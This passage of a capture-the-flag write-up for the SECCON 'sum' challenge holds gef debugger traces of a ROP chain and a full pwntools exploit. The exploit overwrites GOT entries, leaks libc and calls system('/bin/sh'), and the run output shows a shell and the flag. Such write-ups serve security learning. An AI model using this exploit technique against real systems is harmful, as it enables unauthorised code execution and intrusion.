0x00007ffd12150f20│+0x0008: 0x0000000000400a43  →  <__libc_csu_init+99> pop rdi
0x00007ffd12150f28│+0x0010: 0x00007fab33599e9a  →  0x0068732f6e69622f ("/bin/sh"?)
0x00007ffd12150f30│+0x0018: 0x00007fab33435440  →  <system+0> test rdi, rdi
0x00007ffd12150f38│+0x0020: 0x0000000000000000
0x00007ffd12150f40│+0x0028: 0x0000000000000000
0x00007ffd12150f48│+0x0030: 0x00007ffd12150f50  →  0x0000ff5666dcfd1d
0x00007ffd12150f50│+0x0038: 0x0000ff5666dcfd1d
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
 →   0x400a43 <__libc_csu_init+99> pop    rdi
     0x400a44 <__libc_csu_init+100> ret    
     0x400a45                  nop    
     0x400a46                  nop    WORD PTR cs:[rax+rax*1+0x0]
     0x400a50 <__libc_csu_fini+0> repz   ret
     0x400a52                  add    BYTE PTR [rax], al
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "sum_ccafa40ee6a", stopped, reason: SINGLE STEP
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x400a43 → __libc_csu_init()
[#1] 0x400a43 → __libc_csu_init()
[#2] 0x7fab33435440 → test rdi, rdi
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
0x0000000000400a43 in __libc_csu_init ()
gef➤  s
[ Legend: Modified register | Code | Heap | Stack | String ]
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x0               
$rbx   : 0x0               
$rcx   : 0x0               
$rdx   : 0x18              
$rsp   : 0x00007ffd12150f20  →  0x0000000000400a43  →  <__libc_csu_init+99> pop rdi
$rbp   : 0x00007ffd12150f60  →  0x00007ffd12150f90  →  0x00007ffd12150fe0  →  0x00007ffd12151030  →  0x00000000004009e0  →  <__libc_csu_init+0> push r15
$rsi   : 0xff5666dcfd1d    
$rdi   : 0x00000000004009c4  →  <main+193> mov eax, 0x0
$rip   : 0x0000000000400a44  →  <__libc_csu_init+100> ret
$r8    : 0x0               
$r9    : 0x0               
$r10   : 0x00007fab33584cc0  →  0x0002000200020002
$r11   : 0x0000000000400a6c  →   add BYTE PTR [rax], al
$r12   : 0x0000000000400670  →  <_start+0> xor ebp, ebp
$r13   : 0x00007ffd12151110  →  0x0000000000000001
$r14   : 0x0               
$r15   : 0x0               
$eflags: [zero CARRY parity ADJUST SIGN trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007ffd12150f20│+0x0000: 0x0000000000400a43  →  <__libc_csu_init+99> pop rdi     ← $rsp
0x00007ffd12150f28│+0x0008: 0x00007fab33599e9a  →  0x0068732f6e69622f ("/bin/sh"?)
0x00007ffd12150f30│+0x0010: 0x00007fab33435440  →  <system+0> test rdi, rdi
0x00007ffd12150f38│+0x0018: 0x0000000000000000
0x00007ffd12150f40│+0x0020: 0x0000000000000000
0x00007ffd12150f48│+0x0028: 0x00007ffd12150f50  →  0x0000ff5666dcfd1d
0x00007ffd12150f50│+0x0030: 0x0000ff5666dcfd1d
0x00007ffd12150f58│+0x0038: 0xc21062d171a89f00
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x400a3e <__libc_csu_init+94> pop    r13
     0x400a40 <__libc_csu_init+96> pop    r14
     0x400a42 <__libc_csu_init+98> pop    r15
 →   0x400a44 <__libc_csu_init+100> ret    
   ↳    0x400a43 <__libc_csu_init+99> pop    rdi
        0x400a44 <__libc_csu_init+100> ret    
        0x400a45                  nop    
        0x400a46                  nop    WORD PTR cs:[rax+rax*1+0x0]
        0x400a50 <__libc_csu_fini+0> repz   ret
        0x400a52                  add    BYTE PTR [rax], al
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "sum_ccafa40ee6a", stopped, reason: SINGLE STEP
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x400a44 → __libc_csu_init()
[#1] 0x400a43 → __libc_csu_init()
[#2] 0x7fab33435440 → test rdi, rdi
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
0x0000000000400a44 in __libc_csu_init ()
gef➤  
```

Then we have the rop gadget to through the address of `/bin/sh` into `rdi`, and return to system:
```
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007ffd12150f28│+0x0000: 0x00007fab33599e9a  →  0x0068732f6e69622f ("/bin/sh"?)     ← $rsp
0x00007ffd12150f30│+0x0008: 0x00007fab33435440  →  <system+0> test rdi, rdi
0x00007ffd12150f38│+0x0010: 0x0000000000000000
0x00007ffd12150f40│+0x0018: 0x0000000000000000
0x00007ffd12150f48│+0x0020: 0x00007ffd12150f50  →  0x0000ff5666dcfd1d
0x00007ffd12150f50│+0x0028: 0x0000ff5666dcfd1d
0x00007ffd12150f58│+0x0030: 0xc21062d171a89f00
0x00007ffd12150f60│+0x0038: 0x00007ffd12150f90  →  0x00007ffd12150fe0  →  0x00007ffd12151030  →  0x00000000004009e0  →  <__libc_csu_init+0> push r15     ← $rbp
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
 →   0x400a43 <__libc_csu_init+99> pop    rdi
     0x400a44 <__libc_csu_init+100> ret    
     0x400a45                  nop    
     0x400a46                  nop    WORD PTR cs:[rax+rax*1+0x0]
     0x400a50 <__libc_csu_fini+0> repz   ret
     0x400a52                  add    BYTE PTR [rax], al
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "sum_ccafa40ee6a", stopped, reason: SINGLE STEP
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x400a43 → __libc_csu_init()
[#1] 0x7fab33435440 → test rdi, rdi
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
0x0000000000400a43 in __libc_csu_init ()
gef➤  s
[ Legend: Modified register | Code | Heap | Stack | String ]
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x0               
$rbx   : 0x0               
$rcx   : 0x0               
$rdx   : 0x18              
$rsp   : 0x00007ffd12150f30  →  0x00007fab33435440  →  <system+0> test rdi, rdi
$rbp   : 0x00007ffd12150f60  →  0x00007ffd12150f90  →  0x00007ffd12150fe0  →  0x00007ffd12151030  →  0x00000000004009e0  →  <__libc_csu_init+0> push r15
$rsi   : 0xff5666dcfd1d    
$rdi   : 0x00007fab33599e9a  →  0x0068732f6e69622f ("/bin/sh"?)
$rip   : 0x0000000000400a44  →  <__libc_csu_init+100> ret
$r8    : 0x0               
$r9    : 0x0               
$r10   : 0x00007fab33584cc0  →  0x0002000200020002
$r11   : 0x0000000000400a6c  →   add BYTE PTR [rax], al
$r12   : 0x0000000000400670  →  <_start+0> xor ebp, ebp
$r13   : 0x00007ffd12151110  →  0x0000000000000001
$r14   : 0x0               
$r15   : 0x0               
$eflags: [zero CARRY parity ADJUST SIGN trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007ffd12150f30│+0x0000: 0x00007fab33435440  →  <system+0> test rdi, rdi     ← $rsp
0x00007ffd12150f38│+0x0008: 0x0000000000000000
0x00007ffd12150f40│+0x0010: 0x0000000000000000
0x00007ffd12150f48│+0x0018: 0x00007ffd12150f50  →  0x0000ff5666dcfd1d
0x00007ffd12150f50│+0x0020: 0x0000ff5666dcfd1d
0x00007ffd12150f58│+0x0028: 0xc21062d171a89f00
0x00007ffd12150f60│+0x0030: 0x00007ffd12150f90  →  0x00007ffd12150fe0  →  0x00007ffd12151030  →  0x00000000004009e0  →  <__libc_csu_init+0> push r15     ← $rbp
0x00007ffd12150f68│+0x0038: 0x00000000004009ac  →  <main+169> mov rax, QWORD PTR [rbp-0x10]
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x400a3e <__libc_csu_init+94> pop    r13
     0x400a40 <__libc_csu_init+96> pop    r14
     0x400a42 <__libc_csu_init+98> pop    r15
 →   0x400a44 <__libc_csu_init+100> ret    
   ↳  0x7fab33435440 <system+0>       test   rdi, rdi
      0x7fab33435443 <system+3>       je     0x7fab33435450 <system+16>
      0x7fab33435445 <system+5>       jmp    0x7fab33434eb0
      0x7fab3343544a <system+10>      nop    WORD PTR [rax+rax*1+0x0]
      0x7fab33435450 <system+16>      lea    rdi, [rip+0x164a4b]        # 0x7fab33599ea2
      0x7fab33435457 <system+23>      sub    rsp, 0x8
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "sum_ccafa40ee6a", stopped, reason: SINGLE STEP
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x400a44 → __libc_csu_init()
[#1] 0x7fab33435440 → test rdi, rdi
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
0x0000000000400a44 in __libc_csu_init ()
gef➤  x/s $rdi
0x7fab33599e9a:    "/bin/sh"
gef➤  
```

## Exploit

Putting it all together, we have the following exploit:
```
from pwn import *

# Establish the target
#target = remote("sum.chal.seccon.jp", 10001)
target = process('sum_ccafa40ee6a5a675341787636292bf3c84d17264', env={"LD_PRELOAD":"./libc.so"})
#gdb.attach(target, gdbscript='b *0x4009bf\nb *0x4009a7')

# Establish the libc / binary files
elf = ELF('sum_ccafa40ee6a5a675341787636292bf3c84d17264')
libc = ELF("libc.so")

# Establish some needed addresses
main = elf.symbols['main']

popRdi = 0x400a43


# A function to handle the qword writes
def write(adr, value):
    target.sendline("9223372036854775807")
    target.sendline(str(0x7fffffffffffffff - adr))
    target.sendline("1")
    target.sendline("1")
    target.sendline(str(value))

    target.sendline(str(adr))

# Overwrite got address of exit with the starting address of main
write(elf.got['exit'], main)

# Overwrite got address of printf with popRdi gadget
write(elf.got['printf'], popRdi)

# Rop chain to leak libc via puts(got_puts)
target.sendline(str(popRdi))                # pop rdi to make puts call
target.sendline(str(elf.got['puts']))       # got address of puts, argument to puts call
target.sendline(str(elf.symbols['puts']))   # plt address of puts
target.sendline(str(0x4009a7))              # address of `call exit`, to bring us back to start of main
target.sendline("0")                        # 0 to end number sequence


# Scan in output of program, to make it to the infoleak
for i in range(0, 18):
    print target.recvline()

# Scan in and parse out infoleak, figure out where libc base is
leak = target.recvline().strip("\n")
leak = u64(leak + "\x00"*(8 - len(leak)))
base = leak - libc.symbols["puts"]

print "base is: " + hex(base)

# Rop chain to call system("/bin/sh")
target.sendline(str(popRdi))                        # pop rdi to make system call
target.sendline(str(base + 0x1b3e9a))               # binsh libc address
target.sendline(str(base + libc.symbols["system"])) # libc address of system, which we will return to
target.sendline("0")                                # 0 to end sequence


target.interactive()
```

When we run it:
```
$    python exploit.py
[+] Opening connection to sum.chal.seccon.jp on port 10001: Done
[*] '/home/guyinatuxedo/Desktop/seccon/sum/sum_ccafa40ee6a5a675341787636292bf3c84d17264'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] '/home/guyinatuxedo/Desktop/seccon/sum/libc.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[sum system]

Input numbers except for 0.

0 is interpreted as the end of sequence.



[Example]

2 3 4 0

[sum system]

Input numbers except for 0.

0 is interpreted as the end of sequence.



[Example]

2 3 4 0

[sum system]

Input numbers except for 0.

0 is interpreted as the end of sequence.



[Example]

2 3 4 0

base is: 0x7f796623c000
[*] Switching to interactive mode
[sum system]
Input numbers except for 0.
0 is interpreted as the end of sequence.

[Example]
2 3 4 0
$ w
 20:42:25 up 18:10,  0 users,  load average: 0.02, 0.01, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
$ ls
bin
boot
dev
etc
flag.txt
home
lib
lib64
media
mnt
opt
proc
root
run
sbin
srv
start.sh
sum
sys
tmp
usr
var
$ cat flag.txt
SECCON{ret_call_call_ret??_ret_ret_ret........shell!}
$  
```

Just like that, we pwned the challenge!